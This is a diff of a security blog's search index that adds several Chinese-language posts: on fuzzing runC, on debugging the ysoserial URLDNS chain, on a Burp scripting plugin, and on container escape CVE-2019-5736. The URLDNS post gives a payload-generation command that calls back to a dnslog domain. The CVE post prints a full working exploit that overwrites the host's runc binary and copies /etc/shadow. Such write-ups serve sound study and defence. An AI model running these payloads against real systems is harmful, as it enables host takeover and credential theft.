@@ -118,15 +118,14 @@ https://portswigger.net/burp/documentation/desktop/tools/dom-invader
 
 ]]></content>
       <categories>
-        <category>Noel</category>
-        <category>Web</category>
+        <category>渗透测试</category>
       </categories>
       <tags>
         <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
-    <title>Go-fuzz的解析与思考</title>
+    <title>云原生项目Fuzz特点及思考</title>
     <url>//post/Go-Fuzz%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83.html</url>
     <content><![CDATA[Go-fuzz的解析与思考go-fuzz
 Go-fuzz的原理很多都是基于AFL，这里只分析了一些它独特的地方，收获很多，也希望可以和大家交流，如有分析错误还望交流指正。
@@ -627,8 +626,7 @@ https://github.com/dvyukov/go-fuzz
 
 ]]></content>
       <categories>
-        <category>Clock</category>
-        <category>Golang</category>
+        <category>漏洞挖掘</category>
       </categories>
       <tags>
         <tag>Fuzz</tag>
@@ -1084,11 +1082,10 @@ https://github.com/pr0cf5/kernel-exploit-practice
 
 ]]></content>
       <categories>
-        <category>Linux</category>
-        <category>Kernel</category>
+        <category>Linux Kernel</category>
       </categories>
       <tags>
-        <tag>Kernel</tag>
+        <tag>Linux Kernel</tag>
       </tags>
   </entry>
   <entry>
@@ -1341,11 +1338,10 @@ afterTraverse方法与beforeTraverse方法类似，唯一的区别是它只在�
 P.S.我们需要知道你需要什么样的Node，进行什么样的操作，Node下数据的格式会有哪几种情况，会不会因为代码不够严谨导致错误或者无限递归
 ]]></content>
       <categories>
-        <category>Zitui</category>
-        <category>PHP</category>
+        <category>漏洞挖掘</category>
       </categories>
       <tags>
-        <tag>PHP-Parser</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -1628,13 +1624,198 @@ https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc29845
 ]]></content>
       <categories>
         <category>CTF</category>
+        <category>容器安全</category>
       </categories>
       <tags>
         <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
-    <title>Ubuntu 20.04更新内核到指定版本</title>
+    <title>runC-fuzz</title>
+    <url>//post/RunC-Fuzz.html</url>
+    <content><![CDATA[runC-fuzz​本文主要是根据AdaLogics开源的runc-fuzzers和自己之前做的一些fuzz，研究一下可能的问题和相关的解决方案。在此之前可能会有朋友对runc比较陌生，可以参考一下之前的文章：https://bbs.pediy.com/thread-271130.htm
+AdaLogics如何fuzz​runC是go语言编写的，那么对于fuzz引擎的选择毫无疑问应该是go-fuzz，纵观runC的项目结构，其实就是包裹了libcontainer，这也不难理解，因为在我的印象里面runC项目本身就是为了符合OCI标准拆分出来的。
+​如果是fuzz的话，go语言里面最经常出现的问题其实就是索引超出边界，切片边界超出范围nil指针解引用等等，因此对于go-fuzz这种深入项目内部编写Fuzz函数的引擎，其实对于项目内部目标的选取十分关键。在AdaLogics的报告中指出runC具备较少的fuzz引擎入口点，因为现代模糊测试引擎其实更加适合解析，比如文本解析，编码解码或者各种其它API，但是这其实在runC里面比较少。
+​首先分析AdaLogics是怎么做的，在思考了上述问题之后他们把目标放在了API和信息解析上面，相对于信息解析还好说，本身利用go-fuzz引擎生成的大量数据可以轻松实现fuzz，但是对于API来说，其输入内容还是相对结构化的，可以看看下面的例子：
+// 抽取的runC代码片段
+func parseCgroupFromReader(r io.Reader) (string, error) {
+    s := bufio.NewScanner(r)
+    for s.Scan() {
+        var (
+            text  = s.Text()
+            parts = strings.SplitN(text, ":", 3)
+        )
+        if len(parts) &lt; 3 {
+            return "", fmt.Errorf("invalid cgroup entry: %q", text)
+        }
+        // text is like "0::/user.slice/user-1001.slice/session-1.scope"
+        if parts[0] == "0" &amp;&amp; parts[1] == "" {
+            return parts[2], nil
+        }
+    }
+    if err := s.Err(); err != nil {
+        return "", err
+    }
+    return "", errors.New("cgroup path not found")
+}
+
+这样的代码显然就比较适合利用go-fuzz引擎生成的测试用例直接跑fuzz，但是对于下面的例子：
+func statPids(dirPath string, stats *cgroups.Stats) error {
+    current, err := fscommon.GetCgroupParamUint(dirPath, "pids.current")
+    if err != nil {
+        if os.IsNotExist(err) {
+            return statPidsFromCgroupProcs(dirPath, stats)
+        }
+        return err
+    }
+
+    max, err := fscommon.GetCgroupParamUint(dirPath, "pids.max")
+    if err != nil {
+        return err
+    }
+    // If no limit is set, read from pids.max returns "max", which is
+    // converted to MaxUint64 by GetCgroupParamUint. Historically, we
+    // represent "no limit" for pids as 0, thus this conversion.
+    if max == math.MaxUint64 {
+        max = 0
+    }
+
+    stats.PidsStats.Current = current
+    stats.PidsStats.Limit = max
+    return nil
+}
+
+这显然就是比较结构化的输入了，其实这种问题在面对其它语言的时候也有遇到，结构化Fuzz一直是Fuzz的难点之一，但是和go-fuzz项目，因为引擎和fuzz方式的不同其实在结构化上面也有很大的差异，比如一些C/C++项目，可能会用protobuf或者中间语言IR的方式来实现数据结构化，但是go-fuzz的话在对应的Fuzz函数内部引入这些功能无疑是比较麻烦。这里AdaLogics实现了go-fuzz-headers来帮助实现结构化。
+​        从statPids就可以看出，在结构化的目标中大多都是相关结构体：
+type Stats struct {
+    CpuStats    CpuStats    `json:"cpu_stats,omitempty"`
+    CPUSetStats CPUSetStats `json:"cpuset_stats,omitempty"`
+    MemoryStats MemoryStats `json:"memory_stats,omitempty"`
+    PidsStats   PidsStats   `json:"pids_stats,omitempty"`
+    BlkioStats  BlkioStats  `json:"blkio_stats,omitempty"`
+    // the map is in the format "size of hugepage: stats of the hugepage"
+    HugetlbStats map[string]HugetlbStats `json:"hugetlb_stats,omitempty"`
+    RdmaStats    RdmaStats               `json:"rdma_stats,omitempty"`
+}
+
+因此其实只需要吧go-fuzz根据种子数据生成的脏数据进行结构体类型转化就能实现这个目标，这也正是go-fuzz-headers所做的，当然实际要做的工作比这个目标要麻烦的多。
+​        在实现了结构化之后接下来其实就比较简单了，选取目标进行Fuzz，AdaLogics对项目结构进行分析之后决定选取下面库作为目标：
+
+fs2
+specconv
+devices
+fscommon
+intelrdt
+libcontainer
+user
+userns
+configs
+
+总共建立了12个Fuzz，在库中选取符合文本解析，编码解码或者各种其它API这些目标的函数进行了Fuzz。
+我如何Fuzz​        其实在runc-fuzzers开源以前本人就开始思考如何对容器相关的目标进行fuzz，对比该开源项目其实在runc的fuzz上面我们撞了很多库和函数，因此对于这一部分就不多说了，本人做的不足的是没有实现类似go-fuzz-headers这样的辅助库来帮助生成更强大的语料库，而是通过裁剪目标函数来让目标更适合fuzz引擎，对比之下本人的语料库显然low了很多，但是这种裁剪也使得目标每一部分的代码更清晰明了，个人觉得还是有助于发现一些细节问题的，并且fuzz的速度也应该更快。
+​        在对于目标的选取上，本人也更加“放肆”，因为因为容器的安全模型还不完善不必过于考虑引擎入口点的问题（也可能是我拆代码的原因）对apparmor这类的库也进行了Fuzz编写，但是问题在于合理的属于也可能带来灾难性的后果，详情可以参考之前分析的apparmor漏洞，但是这些逻辑类型的漏洞很难通过fuzz来找到，希望大佬们有啥更好的办法可以提出吧。
+结果如何​        其实结果对于一个安全研究者来说是绝望的，可以看下AdaLogics发布的漏洞报告：
+
+The fuzzers found no bug during the assessment, which is a great achievement to the RunC and Umoci authors. However, we acknowledge that there is a reasonable expectation that bugs will occur once the pending pull requests are merged in. We go into details with this in the next section.
+
+本人自己的Fuzz在跑了2天之后也是no bug found，这也说明或许对于这些go项目来说，它们一边自身不断的集成Fuzz：比如runC的fuzz pr，或者是argo的fuzz项目都开始利用oss-fuzz将fuzz演变为常态化的手段来不断测试新加入的项目代码，同时从报告里看出，fuzz也确实需要常态化：
+
+未来展望​        一方面，这些其实只是对于runc项目进行了部分测试，就代码覆盖率而言其实完全不能算是达标，同时fuzz本身的运行时间过短其实不能算是一次合格的模糊测试，就长期来看Fuzz需要在CI tests中不断继承来确保软件的内生安全问题，通过持续不断的Fuzz运行也会不断的对新代码进行安全测试。
+​        就长远来看AdaLogics提出了一种观点，在fuzz中产生容器同时在容器内运行大量不同进程来进行整体性的安全测试，但是就目前fuzz的成熟度而言，还远不能达到这种效果。
+    err := container.Run(process) 
+if err != nil {
+    container.Destroy() 
+  logrus.Fatal(err) 
+  return
+}
+
+]]></content>
+      <categories>
+        <category>漏洞挖掘</category>
+      </categories>
+      <tags>
+        <tag>fuzz</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>URLDNS调试那些小事</title>
+    <url>//post/URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B.html</url>
+    <content><![CDATA[URLDNS调试那些小事近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。
+ysoserial链接：下载地址: https://github.com/frohoff/ysoserial
+这里用jdk1.8来编译
+
+编译ysoserial用JIdea打开导入，会自动导入依赖，导入以后可能还会出现pom.xml红色表示找不到对应依赖的情况，这时可以进入依赖文件夹，可能是用于多个版本jar下载到了其他版本，删除版本然后，再重下载即可（俺在这里卡了好久）。
+下载好后进入GeneratePayload这个类
+进行run，若出现报错可能对应的jar包的版本不对，删除jar包重新下载。
+若运行成功后
+
+按下蓝色小闪电，然后package进行编译打包。
+target目录下会显示编译好的jar包。
+漏洞搭建建立maven项目：
+import java.io.FileInputStream;
+import java.io.ObjectInputStream;
+
+public class bug {
+    public static void main(String[] args) throws Exception {
+        FileInputStream inputStream = new FileInputStream("poc.ser");
+        ObjectInputStream oi = new ObjectInputStream(inputStream);
+        oi.readObject();
+        oi.close();
+        System.out.println("反序列化完成");
+
+    }
+}
+
+ps：漏洞环境不太准确，只是把序列化文件读进去，然后进行反序列化而已。
+生成恶意poc：
+在http://dnslog.cn/
+获得临时域名：0dt3fc.dnslog.cn
+ java -jar .\ysoserial-0.0.5-all.jar URLDNS “http://0dt3fc.dnslog.cn" &gt; poc.ser
+将poc.ser放在漏洞项目根目录运行即可。
+
+注：这里有一个坑点，要是以powershell去生成poc文件会执行报错，需cmd，可参考：https://gitter.im/frohoff/ysoserial/archives/2017/09/18
+调试大致原理是java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，常用作无回显情况下验证java反序列漏洞的情况（俺没碰见过，可能是太菜了，或者运气不好哦）。
+在URLDNS.java下，作者写了如下利用链：
+ *   Gadget Chain:
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+ *
+
+在刚开始会new  HashMap()，
+
+接下来会调用会调用putVal方法，putVal作用在于HashMap放入键值，这里调用了hash方法来处理key
+
+值得关注key.hashCode()方法，
+
+当hashcode==-1时会执行hashCode = handler.hashCode(this);（默认值为-1所以这里不用太在意）
+这里调用getHostAddress
+
+他会进行dns的查询。
+然后就是一些细节：
+在Hashmap的readObject
+
+key是从readObject得到的，说明key应该在writeObject被写入了。
+WriteObject最后会调用到internalWriteEntries(s)。
+
+从中可看出，key和value都来自table，即HashMap中table的值。
+要修改table一般会调用HashMap的put方法，从而调用putVal，这样就会造成dns请求，会和目标机器的混淆。
+
+这里ysoserial 继承抽象类SilentURLStreamHandler类，重写了openConnection和getHostAddress，
+可以直接返回NULL，不会有后续的操作，从而不会dns请求。
+知道这些我们也可以通过反射来将poc再写一遍，网上大佬们写的很完善了，俺就不班门弄斧了。
+参考：
+https://www.yuque.com/pmiaowu/gpy1q8/ygthda
+https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc
+https://xz.aliyun.com/t/7157?page=5
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Ubuntu 更新内核到指定版本</title>
     <url>//post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html</url>
     <content><![CDATA[记一次更新内核到5.8.0-33-generic
 
@@ -1690,11 +1871,495 @@ iU：已进入 apt 安装队列，但还未被安装（不可移除）
 
 ]]></content>
       <categories>
-        <category>Zitui</category>
-        <category>Ubuntu</category>
+        <category>系统运维</category>
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>容器进程切换漏洞</title>
+    <url>//post/%E5%AE%B9%E5%99%A8%E8%BF%9B%E7%A8%8B%E5%88%87%E6%8D%A2%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[容器进程切换思考前置技术Magic Link​        /proc/目录下存在很多的链接文件，但是在Linux 也存在一种特殊的链接文件，这种文件的大小为0，我们知道普通的链接文件的大小等于链接目标的文件路径长度，但是Magic Link的大小为0，它们在打开方式上面也存在差别，普通链接文件会解析出链接文件的路径然后进行打开操作，但是Magic LInk的话不会这样，它会调用内核专门的处理函数，然后返回目标文件的文件描述符。
+
+匿名文件​        Linux Anonymous Files，也叫匿名文件，匿名文件和普通的文件十分类似，可以被定义，修改，写入，读取等等，但是和普通文件不同的是它并不是一个实体的文件，当用户使用memfd_create创建一个匿名文件的时候会返回一个文件描述符，一旦对这个文件描述符的所有引用都被丢弃的时候，该匿名文件就会被销毁，而且在该文件的整个生命周期中都是存在于内存的RAM当中，并不具备实体的文件。
+mount namespace是如何实现的？​        首先要了解在内核进程结构体task_struct里面存在一个nsproxy成员：
+    struct task_struct {
+    .........
+    /* Namespaces: */
+    struct nsproxy            *nsproxy;
+    .......
+    }
+
+nsproxy结构体如下：
+struct nsproxy {
+    atomic_t count;
+    struct uts_namespace *uts_ns;
+    struct ipc_namespace *ipc_ns;
+    struct mnt_namespace *mnt_ns;
+    struct pid_namespace *pid_ns_for_children;
+    struct net          *net_ns;
+    struct time_namespace *time_ns;
+    struct time_namespace *time_ns_for_children;
+    struct cgroup_namespace *cgroup_ns;
+};
+
+可以看到各种不同的namespace都有自己的相关结构体，但是本文着重介绍mount namespace相关实现，因此通过追踪内核中进程的创建过程发现mount namespace的实现如下：
+内核函数调用链：
+kernel_clone(_do_fork) -&gt; copy_process
+
+在copy_process中发现大量和namespace相关的信息：
+static __latent_entropy struct task_struct *copy_process(
+                    struct pid *pid,
+                    int trace,
+                    int node,
+                    struct kernel_clone_args *args)
+{
+    int pidfd = -1, retval;
+    struct task_struct *p;
+    struct multiprocess_signals delayed;
+    struct file *pidfile = NULL;
+    u64 clone_flags = args-&gt;flags;
+    struct nsproxy *nsp = current-&gt;nsproxy;
+
+    /*
+     * Don't allow sharing the root directory with processes in a different
+     * namespace
+     */
+    if ((clone_flags &amp; (CLONE_NEWNS|CLONE_FS)) == (CLONE_NEWNS|CLONE_FS))
+        return ERR_PTR(-EINVAL);
+
+    if ((clone_flags &amp; (CLONE_NEWUSER|CLONE_FS)) == (CLONE_NEWUSER|CLONE_FS))
+        return ERR_PTR(-EINVAL);
+......
+}
+
+可以看到其实进程间的namespace可能具备某种继承关系，因此自然联想到系统0号进程，查阅相关资料发现存在init_task，它在内核刚启动的时候就进行了初始化，而且在相关结构体里面也确实找到了对于nsproxy的初始化：
+......
+    .nsproxy    = &amp;init_nsproxy,
+......
+
+init_nsproxy的相关定义如下：
+struct nsproxy init_nsproxy = {
+    .count            = ATOMIC_INIT(1),
+    .uts_ns            = &amp;init_uts_ns,
+#if defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)
+    .ipc_ns            = &amp;init_ipc_ns,
+#endif
+    .mnt_ns            = NULL,
+    .pid_ns_for_children    = &amp;init_pid_ns,
+#ifdef CONFIG_NET
+    .net_ns            = &amp;init_net,
+#endif
+#ifdef CONFIG_CGROUPS
+    .cgroup_ns        = &amp;init_cgroup_ns,
+#endif
+#ifdef CONFIG_TIME_NS
+    .time_ns        = &amp;init_time_ns,
+    .time_ns_for_children    = &amp;init_time_ns,
+#endif
+};
+
+可以发现，mnt_ns的相关初始化函数是NULL，因此mnt_ns并不继承父进程命名空间，回过头来看之前的copy_namespaces函数，发现其中存在create_new_namespaces函数调用，在其中发现mnt_namespace确实是通过copy_mnt_ns函数新创建的，至此我们已经大致了解了整个mnt_namespace的实现和创建流程。同时，通过copy_mnt_ns函数大致了解到，其实就是提供了独立的文件系统视图，设置各种挂载点，因此只要帮助绕过视图的影响就可以绕过mount namespace，所以符号链接攻击一直也是容器的痛点问题之一。
+runC nsenter模块​        在查看runC源码的时候发现nsenter模块，改模块的主要实现使用C语言写的，而且只在init.go的import中被引入，因此它的执行顺序是很靠前的。
+package nsenter
+
+/*
+#cgo CFLAGS: -Wall
+extern void nsexec();
+void __attribute__((constructor)) init(void) {
+    nsexec();
+}
+*/
+import "C"
+
+在import “C”前面紧跟注释是cgo的一种特殊语法，注释里面包含的都是c语言的语法
+漏洞分析​        在容器中执行docker run或者docker exec的时候，最终结果都是runC驱动执行用户想要执行的命令。同时，分析runC源码发现，无论是runC run还是runC exec，一个比较核心的思想就是创建一个runner结构体，然后调用其实现的run()函数：
+func execProcess(context *cli.Context) (int, error) {
+    container, err := getContainer(context)
+    if err != nil {
+        return -1, err
+    }
+    status, err := container.Status()
+    if err != nil {
+        return -1, err
+    }
+    if status == libcontainer.Stopped {
+        return -1, errors.New("cannot exec in a stopped container")
+    }
+    if status == libcontainer.Paused &amp;&amp; !context.Bool("ignore-paused") {
+        return -1, errors.New("cannot exec in a paused container (use --ignore-paused to override)")
+    }
+    path := context.String("process")
+    if path == "" &amp;&amp; len(context.Args()) == 1 {
+        return -1, errors.New("process args cannot be empty")
+    }
+    state, err := container.State()
+    if err != nil {
+        return -1, err
+    }
+    bundle := utils.SearchLabels(state.Config.Labels, "bundle")
+    p, err := getProcess(context, bundle)
+    if err != nil {
+        return -1, err
+    }
+
+    cgPaths, err := getSubCgroupPaths(context.StringSlice("cgroup"))
+    if err != nil {
+        return -1, err
+    }
+
+    r := &amp;runner{
+        enableSubreaper: false,
+        shouldDestroy:   false,
+        container:       container,
+        consoleSocket:   context.String("console-socket"),
+        detach:          context.Bool("detach"),
+        pidFile:         context.String("pid-file"),
+        action:          CT_ACT_RUN,
+        init:            false,
+        preserveFDs:     context.Int("preserve-fds"),
+        subCgroupPaths:  cgPaths,
+    }
+    return r.run(p)
+}
+
+不过在此之前都会通过loadFactory类来创建基础的libcontainer以便和容器进行交互，在exec.go中，getContainer的一个重要功能就是创建libccontainer实例：
+// loadFactory returns the configured factory instance for execing containers.
+func loadFactory(context *cli.Context) (libcontainer.Factory, error) {
+    root := context.GlobalString("root")
+    abs, err := filepath.Abs(root)
+    if err != nil {
+        return nil, err
+    }
+
+    intelRdtManager := libcontainer.IntelRdtFs
+
+    // We resolve the paths for {newuidmap,newgidmap} from the context of runc,
+    // to avoid doing a path lookup in the nsexec context. TODO: The binary
+    // names are not currently configurable.
+    newuidmap, err := exec.LookPath("newuidmap")
+    if err != nil {
+        newuidmap = ""
+    }
+    newgidmap, err := exec.LookPath("newgidmap")
+    if err != nil {
+        newgidmap = ""
+    }
+
+    return libcontainer.New(abs, intelRdtManager,
+        libcontainer.CriuPath(context.GlobalString("criu")),
+        libcontainer.NewuidmapPath(newuidmap),
+        libcontainer.NewgidmapPath(newgidmap))
+}
+
+在结尾的New函数中，可以看到runC存储了一个MagicLink作为InitPath:
+// New returns a linux based container factory based in the root directory and
+// configures the factory with the provided option funcs.
+func New(root string, options ...func(*LinuxFactory) error) (Factory, error) {
+    if root != "" {
+        if err := os.MkdirAll(root, 0o700); err != nil {
+            return nil, err
+        }
+    }
+    l := &amp;LinuxFactory{
+        Root:      root,
+        InitPath:  "/proc/self/exe",
+        InitArgs:  []string{os.Args[0], "init"},
+        Validator: validate.New(),
+        CriuPath:  "criu",
+    }
+
+    for _, opt := range options {
+        if opt == nil {
+            continue
+        }
+        if err := opt(l); err != nil {
+            return nil, err
+        }
+    }
+    return l, nil
+}
+
+在接下来的过程中会调用该InitPath，并且参数为init，相当于执行了runC init命令，在该命令中采用cgo的形式导入C语言nstnter进行命名空间的设置：
+package main
+
+import (
+    "os"
+    "runtime"
+    "strconv"
+
+    "github.com/opencontainers/runc/libcontainer"
+    _ "github.com/opencontainers/runc/libcontainer/nsenter"
+    "github.com/sirupsen/logrus"
+)
+......
+
+nsenter如下：
+package nsenter
+
+/*
+#cgo CFLAGS: -Wall
+extern void nsexec();
+void __attribute__((constructor)) init(void) {
+    nsexec();
+}
+*/
+import "C"
+
+可以看到调用了nsexec()函数，该函数在go runtime之前进行调用，函数的主要作用就是解析之前父进程发送的netlink格式的配置信息，然后通过设置usernamespace并创建子进程，然后子进程设置其他一些namespace并通过创建孙进程使相关namespaces生效，这个孙进程其实就是容器中的init进程，不过回想这个过程，runC通过cmd.Start()开启一个子进程执行runC init，在runC init的nsenter包执行过程中，会首先设置自己的user namespace和pid namespace，这就使得在该过程中容器内本身存在的进程可以发现runC进程，因此：
+void nsexec(void)
+{
+    int pipenum;
+    jmp_buf env;
+    int syncpipe[2];
+    struct nlconfig_t config = {0};
+
+    /*
+     * If we don't have an init pipe, just return to the go routine.
+     * We'll only get an init pipe for start or exec.
+     */
+    pipenum = initpipe();
+    if (pipenum == -1)
+        return;
+
+    /* Parse all of the netlink configuration. */
+    nl_parse(pipenum, &amp;config);
+
+    /* clone(2) flags are mandatory. */
+    if (config.cloneflags == -1)
+        bail("missing clone_flags");
+
+    /* Pipe so we can tell the child when we've finished setting up. */
+    if (pipe(syncpipe) &lt; 0)
+        bail("failed to setup sync pipe between parent and child");
+
+    /* Set up the jump point. */
+    if (setjmp(env) == JUMP_VAL) {
+        /*
+         * We're inside the child now, having jumped from the
+         * start_child() code after forking in the parent.
+         */
+        uint8_t s = 0;
+        int consolefd = config.consolefd;
+
+        /* Close the writing side of pipe. */
+        close(syncpipe[1]);
+
+        /* Sync with parent. */
+        if (read(syncpipe[0], &amp;s, sizeof(s)) != sizeof(s) || s != SYNC_VAL)
+            bail("failed to read sync byte from parent");
+
+        if (setsid() &lt; 0)
+            bail("setsid failed");
+
+        if (setuid(0) &lt; 0)
+            bail("setuid failed");
+
+        if (setgid(0) &lt; 0)
+            bail("setgid failed");
+
+        if (setgroups(0, NULL) &lt; 0)
+            bail("setgroups failed");
+
+        if (consolefd != -1) {
+            if (ioctl(consolefd, TIOCSCTTY, 0) &lt; 0)
+                bail("ioctl TIOCSCTTY failed");
+            if (dup3(consolefd, STDIN_FILENO, 0) != STDIN_FILENO)
+                bail("failed to dup stdin");
+            if (dup3(consolefd, STDOUT_FILENO, 0) != STDOUT_FILENO)
+                bail("failed to dup stdout");
+            if (dup3(consolefd, STDERR_FILENO, 0) != STDERR_FILENO)
+                bail("failed to dup stderr");
+        }
+
+        /* Free netlink data. */
+        nl_free(&amp;config);
+
+        /* Finish executing, let the Go runtime take over. */
+        return;
+    }
+
+    /* Run the parent code. */
+    start_child(pipenum, &amp;env, syncpipe, &amp;config);
+
+    /* Should never be reached. */
+    bail("should never be reached");
+}
+
+​        如果，在runc启动之前，容器内部的进程可以通过/proc/目录观察到runc相关的进程，那么就可以通过/proc/runc-pid/exe获得runc具体的路径，这个exe文件是Magic Link文件，这就意味着这个文件的打开过程是调用内核里面专门的处理函数，不是想普通的链接文件那样找到目标链接文件打开，这其实就帮助我们绕过了mnt命名空间和chroot对容器中文件系统资源的限制。
+​        如此我们就可以覆盖掉原本的runc二进制文件为我们的恶意代码，那么当用于下一次执行docker exec或者docker run之类需要调用runc的命令的时候就有可能会调用我们写入的恶意文件从而实现宿主机上面的恶意代码执行从而实现容器逃逸。
+pocpackage main
+
+// Implementation of CVE-2019-5736
+// Created with help from @singe, @_cablethief, and @feexd.
+// This commit also helped a ton to understand the vuln
+// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
+import (
+        "fmt"
+        "io/ioutil"
+        "os"
+        "strconv"
+        "strings"
+)
+
+// This is the line of shell commands that will execute on the host
+var payload = "#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow"
+
+func main() {
+        // First we overwrite /bin/sh with the /proc/self/exe interpreter path
+        fd, err := os.Create("/bin/sh")
+        if err != nil {
+                fmt.Println(err)
+                return
+        }
+        fmt.Fprintln(fd, "#!/proc/self/exe")
+        err = fd.Close()
+        if err != nil {
+                fmt.Println(err)
+                return
+        }
+        fmt.Println("[+] Overwritten /bin/sh successfully")
+
+        // Loop through all processes to find one whose cmdline includes runcinit
+        // This will be the process created by runc
+        var found int
+        for found == 0 {
+                pids, err := ioutil.ReadDir("/proc")
+                if err != nil {
+                        fmt.Println(err)
+                        return
+                }
+                for _, f := range pids {
+                        fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
+                        fstring := string(fbytes)
+                        if strings.Contains(fstring, "runc") {
+                                fmt.Println("[+] Found the PID:", f.Name())
+                                found, err = strconv.Atoi(f.Name())
+                                if err != nil {
+                                        fmt.Println(err)
+                                        return
+                                }
+                        }
+                }
+        }
+
+        // We will use the pid to get a file handle for runc on the host.
+        var handleFd = -1
+        for handleFd == -1 {
+                // Note, you do not need to use the O_PATH flag for the exploit to work.
+                handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
+                if int(handle.Fd()) &gt; 0 {
+                        handleFd = int(handle.Fd())
+                }
+        }
+        fmt.Println("[+] Successfully got the file handle")
+
+        // Now that we have the file handle, lets write to the runc binary and overwrite it
+        // It will maintain it's executable flag
+        for {
+                writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
+                if int(writeHandle.Fd()) &gt; 0 {
+                        fmt.Println("[+] Successfully got write handle", writeHandle)
+                        writeHandle.Write([]byte(payload))
+                        return
+                }
+        }
+}
+
+POC思路：
+
+首先覆盖容器中的/bin/sh为#!/proc/self/exe。
+遍历/proc下的目录找到runC相关进程
+打开/proc下相关的exe文件获得fd
+循环写入 fd，直到runC解除占用，成功写入
+runc最后将执行用户通过docker exec指定的/bin/sh，它的内容在第1步中已经被替换成#!/proc/self/exe，因此实际上将执行宿主机上的runc，而runc也已经在第4部中被我们覆盖掉了。
+
+漏洞补丁具体补丁详情：https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d
+void nsexec(void)
+{
+    int pipenum;
+    @@ -549,6 +552,14 @@ void nsexec(void)
+    if (pipenum == -1)
+        return;
+
+    /*
+     * We need to re-exec if we are not in a cloned binary. This is necessary
+     * to ensure that containers won't be able to access the host binary
+     * through /proc/self/exe. See CVE-2019-5736.
+     */
+    if (ensure_cloned_binary() &lt; 0)
+        bail("could not ensure we are a cloned binary");
+
+    /* Parse all of the netlink configuration. */
+    nl_parse(pipenum, &amp;config);
+
+​        可以看到主要是增加了一个ensure_cloned_binary()函数的判断其中主要的逻辑是通过memfd_create来将让runc在容器内执行操作前首先将自己复制成为一个匿名文件，如此在可以达到原来效果的同时，/proc/self/exe无法触达到原本的runC二进制文件。
+思考​        为了对容器进行有效控制通过宿主机进行容器内外的进程切换其实是必然的，但是稍有不慎就会导致容器信息外带在进程的上下文中，runC的这个漏洞是一个例子还有一个例子就是docker cp漏洞，它本身也是因为docker-tar进程将相关的共享库内容外带到了宿主机导致了容器逃逸，因此在考虑容器安全问题时，对这些危险进程的监控也是十分必要的。
+]]></content>
+      <categories>
+        <category>容器安全</category>
+      </categories>
+      <tags>
+        <tag>容器安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>灵活的修改Burp请求</title>
+    <url>//post/%E7%81%B5%E6%B4%BB%E7%9A%84%E4%BF%AE%E6%94%B9Burp%E8%AF%B7%E6%B1%82.html</url>
+    <content><![CDATA[灵活的修改Burp请求  在日常渗透测试中经常会遇到请求头需要替换、请求或响应内容需要解密等一系列麻烦的事。更换请求头可以通过Burp的Match and Replace功能来实现，加解密也有一些插件可以实现，但是它们普遍存在着以下缺陷：
+
+自定义数据不能进行保存
+
+加解密不能灵活的指定位置
+
+
+  带着这些需求，笔者在寻找工具时发现了一款有趣的插件Python Scripter: https://github.com/PortSwigger/python-scripter 
+简介  与其说这是一个插件，不如说其更像是一个框架。简单地说，它的功能是将当前请求上下文作为全局变量传入用户自定义的代码中，也就是说用户可以随意的修改请求信息。它本身的代码也是很简单的
+  
+  首先是将请求信息传递给用户自定义脚本的集合中，然后每个脚本分别对请求信息进行处理
+  
+  这里的处理其实就是用户编译代码通过后，把操作Burp的接口作为全局变量传递进去并执行
+  
+  这就实现了以插件“写”插件。
+  
+完善  上文的框架让我们有了灵活操纵请求的希望，而https://github.com/lanmaster53/pyscripter-er/blob/master/pyscripterer.py 则成功的将其变为了现实。其定义了一个接受messageInfo等请求信息的Class，并且提供了许多写好的方法以便于更新请求信息，例如删除一个请求头，可以这么写：
+  
+  这样任何请求都将不存在Sec-Ch-Ua-Mobile这个字段，remove_request_headers就是pyscripter-er中定义好的一个方法，主要作用就是遍历移除指定header_name开头的haeder字段并重新构造请求包
+  
+  如果要增加新的通用函数只需要在pyscripterer中进行修改即可，比如增加一个添加请求头的方法
+  
+实战  接下来用实战来检验下，在测试某个网站时碰到了如下加密请求
+  
+  通过分析JS发现其加密算法是base64加上一定的换位：
+  
+  那我们的思路就是每次请求时找到jsonparams这个参数，并对其进行加密，这样在发送请求时我们看到的参数就是未加密的了，方便我们在repeater进行测试。首先创建一个函数用于获取参数，根据参数名遍历即可
+  
+  删除找到的参数，之后重新创建一个新的参数，其值为加密后的值
+  
+  加密函数
+  
+  结合起来调用
+  
+  当我们发送请求
+jsonparams={"UserId":"1234"}
+
+  可以从logger中观测到其发生了变化，在intruder中的请求也会发生变化，再碰到需要爆破的场景时也是很实用的。
+  
